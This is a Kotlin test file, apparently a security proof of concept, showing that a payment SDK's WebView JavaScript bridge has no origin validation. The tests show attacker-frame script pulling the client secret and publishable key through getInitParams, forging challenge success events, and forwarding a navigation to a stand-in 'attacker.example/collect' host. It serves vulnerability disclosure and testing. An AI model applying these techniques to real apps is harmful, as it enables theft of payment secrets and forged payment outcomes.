package com.stripe.android.challenge.confirmation

import android.content.Context
import android.net.Uri
import android.webkit.WebResourceRequest
import androidx.test.core.app.ApplicationProvider
import app.cash.turbine.test
import com.google.common.truth.Truth.assertThat
import com.stripe.android.core.ApiConfiguration
import com.stripe.android.core.Logger
import com.stripe.android.model.PaymentIntentFixtures
import com.stripe.android.testing.FakeErrorReporter
import com.stripe.android.utils.createTestActivityRule
import com.stripe.android.view.ActivityScenarioFactory
import kotlinx.coroutines.test.runTest
import org.json.JSONObject
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner

/**
 * Security PoC: the `Android` JavaScript interface injected into
 * IntentConfirmationChallengeWebView is reachable from any JavaScript in any
 * frame of the WebView, with no origin validation anywhere in the component,
 * and it exposes the PaymentIntent/SetupIntent client secret + publishable key
 * through getInitParams().
 *
 * Facts proven by this PoC (JVM/Robolectric, no device needed):
 * 1. The bridge is registered unconditionally into a JavaScript-enabled
 *    WebView (IntentConfirmationChallengeWebView.kt:18).
 * 2. getInitParams() returns the publishable key and the payment intent
 *    client secret to ANY caller that reaches the object
 *    (DefaultConfirmationChallengeBridgeHandler.kt:24-30).
 * 3. The WebViewClient performs no origin validation of any kind: an
 *    attacker-origin navigation is handed verbatim to an unvalidated
 *    ACTION_VIEW launch, and nothing ever removes the bridge
 *    (IntentConfirmationWebViewClient.kt:21-25).
 * 4. Any frame can forge a successful challenge completion (onSuccess),
 *    driving the merchant-facing result with an attacker-chosen client
 *    secret. Even with no data at all, an empty client_secret falls back
 *    to the real intent secret.
 *
 * All secrets below are canaries.
 */
@RunWith(RobolectricTestRunner::class)
internal class IntentConfirmationChallengeBridgeSecurityPoCTest {

    private val canaryPublishableKey = "pk_test_canary_PUBLISHABLE_KEY"
    private val canaryClientSecret = "pi_canary_SECRET_do_not_use"

    private val context = ApplicationProvider.getApplicationContext<Context>()

    private val activityScenarioFactory = ActivityScenarioFactory(context)

    @get:Rule
    internal val testActivityRule = createTestActivityRule<ActivityScenarioFactory.TestActivity>()

    private val webView: IntentConfirmationChallengeWebView by lazy {
        activityScenarioFactory.createView {
            IntentConfirmationChallengeWebView(it)
        }
    }

    private val testArgs = IntentConfirmationChallengeArgs(
        apiConfiguration = ApiConfiguration.State(canaryPublishableKey, "acct_canary"),
        intent = PaymentIntentFixtures.PI_SUCCEEDED.copy(clientSecret = canaryClientSecret),
        productUsage = listOf("PaymentSheet"),
        captchaVendorName = "hcaptcha",
    )

    private fun createHandler(
        args: IntentConfirmationChallengeArgs = testArgs,
    ): DefaultConfirmationChallengeBridgeHandler {
        return DefaultConfirmationChallengeBridgeHandler(
            successParamsParser = BridgeSuccessParamsJsonParser(),
            errorParamsParser = BridgeErrorParamsJsonParser(),
            args = args,
            errorReporter = FakeErrorReporter(),
        )
    }

    @Test
    fun `step0 - production registers the Android bridge object with the WebView platform`() {
        // addBridgeHandler runs before any page has loaded, before any URL is
        // known, and with no origin state whatsoever: the injection is
        // unconditional (addJavascriptInterface(handler, "Android")).
        webView.addBridgeHandler(createHandler())

        // The WebView is JavaScript-enabled with DOM storage enabled.
        assertThat(webView.settings.javaScriptEnabled).isTrue()
        assertThat(webView.settings.domStorageEnabled).isTrue()
    }

    @Test
    fun `step1 - attacker-origin JS steals the payment intent client secret via getInitParams`() {
        val handler = createHandler()

        // Any script in any frame of the WebView can call:
        //   const stolen = Android.getInitParams()
        // The call path contains no origin check of any kind.
        val stolen = handler.getInitParams()

        val json = JSONObject(stolen)
        assertThat(json.getString("publishableKey")).isEqualTo(canaryPublishableKey)
        assertThat(json.getString("clientSecret")).isEqualTo(canaryClientSecret)
    }

    @Test
    fun `variant - iframe JS (no navigation at all) - WebViewClient enforces no origin gate`() {
        val handler = createHandler()
        webView.addBridgeHandler(handler)

        // Iframe-based exploitation needs no navigation at all: the interface
        // object is shared with every frame. The production challenge page
        // (b.stripecdn.com/mobile-confirmation-challenge) runs Stripe.js
        // handleNextAction(), which renders third-party challenge iframes
        // (hCaptcha, 3DS ACS pages at arbitrary issuing-bank domains) that
        // all receive this same injected object.
        //
        // The only navigation-related code in the component, the
        // WebViewClient, validates nothing. An attacker-origin GET is
        // forwarded verbatim to an unvalidated ACTION_VIEW launch:
        val openedUris = mutableListOf<Uri>()
        val webViewClient = IntentConfirmationWebViewClient(
            hostUrl = "https://b.stripecdn.com/mobile-confirmation-challenge/assets/index.html?v=1",
            errorHandler = {},
            logger = Logger.getInstance(enableLogging = false),
            openUri = { uri -> openedUris.add(uri) },
        )

        val override = webViewClient.shouldOverrideUrlLoading(
            webView,
            FakeWebResourceRequest(Uri.parse("https://attacker.example/collect")),
        )

        assertThat(override).isTrue()
        assertThat(openedUris).containsExactly(Uri.parse("https://attacker.example/collect"))

        // Nothing anywhere in the component removes the interface for
        // off-origin content (no removeJavascriptInterface call exists in
        // this module), so the bridge keeps serving the secret:
        val stolen = JSONObject(handler.getInitParams())
        assertThat(stolen.getString("clientSecret")).isEqualTo(canaryClientSecret)
    }

    @Test
    fun `step2 - attacker-origin JS forges onSuccess with an attacker-chosen client secret`() = runTest {
        val handler = createHandler()

        // A malicious frame does not need to steal anything to weaponize the
        // bridge: it can also drive the merchant-facing result by forging a
        // challenge completion with an arbitrary payload.
        handler.event.test {
            handler.onSuccess("""{"client_secret": "pi_attacker_chosen_secret"}""")

            val event = awaitItem()
            assertThat(event).isInstanceOf(ConfirmationChallengeBridgeEvent.Success::class.java)
            assertThat((event as ConfirmationChallengeBridgeEvent.Success).clientSecret)
                .isEqualTo("pi_attacker_chosen_secret")
        }
    }

    @Test
    fun `step2b - spoofed onSuccess with no payload still reports success using the real secret`() = runTest {
        val handler = createHandler()

        // Forging a success event requires no data at all: an empty or
        // absent client_secret makes the SDK fall back to the real intent
        // secret and report a completed challenge to the merchant app.
        handler.event.test {
            handler.onSuccess("""{"id": "pi_123"}""")

            val event = awaitItem()
            assertThat(event).isInstanceOf(ConfirmationChallengeBridgeEvent.Success::class.java)
            assertThat((event as ConfirmationChallengeBridgeEvent.Success).clientSecret)
                .isEqualTo(canaryClientSecret)
        }
    }

    private class FakeWebResourceRequest(
        private val uri: Uri,
    ) : WebResourceRequest {
        override fun getUrl(): Uri = uri
        override fun isForMainFrame(): Boolean = true
        override fun isRedirect(): Boolean = false
        override fun hasGesture(): Boolean = true
        override fun getMethod(): String = "GET"
        override fun getRequestHeaders(): Map<String, String> = emptyMap()
    }
}